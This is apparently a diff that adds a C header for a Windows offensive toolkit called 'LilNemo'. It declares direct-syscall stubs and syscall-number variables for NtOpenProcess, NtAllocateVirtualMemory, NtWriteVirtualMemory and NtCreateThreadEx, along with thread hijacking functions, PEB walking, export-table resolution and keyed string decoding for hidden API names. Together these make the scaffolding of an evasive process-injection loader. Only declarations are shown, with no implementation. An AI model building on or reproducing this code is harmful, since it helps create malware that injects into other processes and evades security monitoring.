@@ -1,0 +1,146 @@
+#!name##LilNemo_Bag_H
+#!itemType##sfile
+#!info##LittleNemo Bag header file.
+#!lang##c
+
+#ifndef LITTLE_NEMO_BAG_H
+#define LITTLE_NEMO_BAG_H
+
+#include "little_nemo_core.h"
+#include "little_nemo_food.h"
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <ntdef.h>
+#include <tlhelp32.h>
+
+#define LIL_NEMO_BAG_BUFF_SIZE 64
+#define LIL_NEMO_BAG_DEFAULT_BALLOC_PART_SIZE 512
+#define LIL_NEMO_BAG_PTR_BUFF_SIZE 32
+
+
+typedef struct _CLIENT_ID
+{
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _IO_STATUS_BLOCK {
+  union {
+    NTSTATUS Status;
+    PVOID    Pointer;
+  };
+  ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+// Def WinApi functions
+typedef HMODULE (*NTypeLoadLibraryA)(LPCSTR);
+typedef INT (*NTypeMultiByteToWideChar)(UINT, DWORD, const char*, int, LPWSTR, int);
+typedef NTSTATUS (*NTypeLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, HMODULE*);
+typedef NTSTATUS (*NTypeNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+typedef NTSTATUS (*NTypeNtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+typedef NTSTATUS (*NTypeNtClose)(HANDLE);
+typedef NTSTATUS (*NTypeNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+typedef NTSTATUS (*NTypeNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (*NTypeNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (*NTypeNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef HANDLE (*NTypeCreateToolhelp32Snapshot)(DWORD, DWORD);
+typedef BOOL (*NTypeProcess32First)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL (*NTypeProcess32Next)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL (*NTypeCloseHandle)(HANDLE);
+typedef BOOL (*NTypeThread32First)(HANDLE, LPTHREADENTRY32);
+typedef BOOL (*NTypeThread32Next)(HANDLE, LPTHREADENTRY32);
+typedef DWORD (*NTypeSuspendThread)(HANDLE);
+typedef DWORD (*NTypeResumeThread)(HANDLE);
+typedef BOOL (*NTypeGetThreadContext)(HANDLE, LPCONTEXT);
+typedef BOOL (*NTypeSetThreadContext)(HANDLE, LPCONTEXT);
+typedef NTSTATUS (*NTypeNtOpenThread)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, PCLIENT_ID);
+
+
+// LilNemo Types
+typedef uint16_t* (*NNType_NemoFoodBasic)(uint16_t *buff, uint16_t buff_size);
+typedef uint16_t** (*NNType_NemoFoodList)(uint16_t* buff[], uint16_t buff_size);
+
+
+// SysCall Variables
+extern uint32_t nemo_ssn_ntcreatefile;
+extern uint32_t nemo_ssn_ntwritefile;
+extern uint32_t nemo_ssn_ntclose;
+extern uint32_t nemo_ssn_ntopenprocess;
+extern uint32_t nemo_ssn_NtAllocateVirtualMemory;
+extern uint32_t nemo_ssn_NtWriteVirtualMemory;
+extern uint32_t nemo_ssn_NtCreateThreadEx;
+
+// SysCall Functions
+extern NTSTATUS NemoCandy_ntcreatefile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+extern NTSTATUS NemoCandy_NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+extern NTSTATUS NemoCandy_NtAllocateVirtualMemory(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+extern NTSTATUS NemoCandy_NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+extern NTSTATUS NemoCandy_NtCreateThreadEx(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+
+typedef struct _LIL_NEMO_BAG {
+    uint16_t default_buff_size;
+    uint16_t default_ptr_buff_size;
+    uint16_t ekey[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t mod_list[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t rva_exp_tab[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_k32[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_ntdll[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_kbase[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t str_key[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_multi_byte[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_load_lib[LIL_NEMO_BAG_BUFF_SIZE];
+    uint16_t raw_load_ldr_lib[LIL_NEMO_BAG_BUFF_SIZE];
+
+
+    pNEMO_BALLOC_MEM balloc;
+    int FLAG_balloc_mem;
+    char *str_buff;
+    int str_buff_size;
+    int FLAG_str_buff;
+    wchar_t *wstr_buff;
+    int wstr_buff_size;
+    int FLAG_wstr_buff;
+
+    uint16_t *tmp_buff;
+    uint16_t tmp_buff_size;
+    int FLAG_tmp_buff;
+
+    NTSTATUS last_ntstatus;
+    int FLAG_use_syscall;
+    int FLAG_use_addr;
+
+    void *addr_k32;
+    void *addr_ntdll;
+    void *addr_kbase;
+    NTypeMultiByteToWideChar *addr_multi_byte;
+    NTypeLdrLoadDll *addr_ldr_load;
+
+    void (*clear)(struct _LIL_NEMO_BAG *bag);
+    void (*update_key)(uint16_t *ekey, struct _LIL_NEMO_BAG *bag);
+    void* (*find_dll)(uint16_t *dll_name, struct _LIL_NEMO_BAG *bag);
+    void* (*find_func)(uint16_t *func_name, uint16_t *dll_name, struct _LIL_NEMO_BAG *bag);
+    void* (*get_func)(uint16_t *func_name, void *dll_addr, struct _LIL_NEMO_BAG *bag);
+    void (*update_raw)(uint16_t *dest, NNType_NemoFoodBasic food_raw_name, struct _LIL_NEMO_BAG *bag);
+    int (*get_raw_dll)(NNType_NemoFoodFuncList food_raw_dll, uint16_t *bag_dest, struct _LIL_NEMO_BAG *bag);
+    void (*set_str_key)(uint16_t *str_key, struct _LIL_NEMO_BAG *bag);
+    void (*update_str_data)(char *str_buff, int buff_size, struct _LIL_NEMO_BAG *bag);
+    void (*update_wstr_data)(wchar_t *wstr_buff, int buff_size, struct _LIL_NEMO_BAG *bag);
+    int (*decode_char)(NNType_NemoFoodFuncText food_text_func, struct _LIL_NEMO_BAG *bag);
+    int (*decode_wchar)(NNType_NemoFoodFuncText food_text_func, struct _LIL_NEMO_BAG *bag);
+    HMODULE (*load_lib)(NNType_NemoFoodFuncText food_dll_path, struct _LIL_NEMO_BAG *bag);
+    HMODULE (*load_lib_char)(char *dll_name, struct _LIL_NEMO_BAG *bag);
+    HMODULE (*load_ldr_dll_char)(char *dll_name, struct _LIL_NEMO_BAG *bag);
+    HMODULE (*load_ldr_dll)(NNType_NemoFoodFuncText food_dll_path, struct _LIL_NEMO_BAG *bag);
+    uint32_t (*get_syscall)(uint16_t *nt_func_name, struct _LIL_NEMO_BAG *bag);
+    uint32_t (*get_syscall2)(void *nt_func_addr);
+    void* (*peb)(struct _LIL_NEMO_BAG *bag);
+    void* (*get_func2)(NNType_NemoFoodBasic food_func_name, void *dll_addr, struct _LIL_NEMO_BAG *bag);
+} LIL_NEMO_BAG, *pLIL_NEMO_BAG;
+
+
+pLIL_NEMO_BAG lil_nemo_bag_make(uint16_t *ekey, NNType_NemoFoodBasic mod_list, NNType_NemoFoodBasic rva_exp, uint16_t *buffer, uint16_t balloc_memory_size, uint16_t *tmp_buff, uint16_t tmp_buff_size);
+pLIL_NEMO_BAG lil_nemo_bag_prepareNemo(uint16_t *ekey, uint16_t *str_key, uint16_t *balloc_buff, uint16_t buff_size, char *str_buff, int str_buff_size, wchar_t *wchar_buff, int wchar_buff_size, uint16_t *tmp_buff, uint16_t tmp_buff_size);
+
+
+#endif
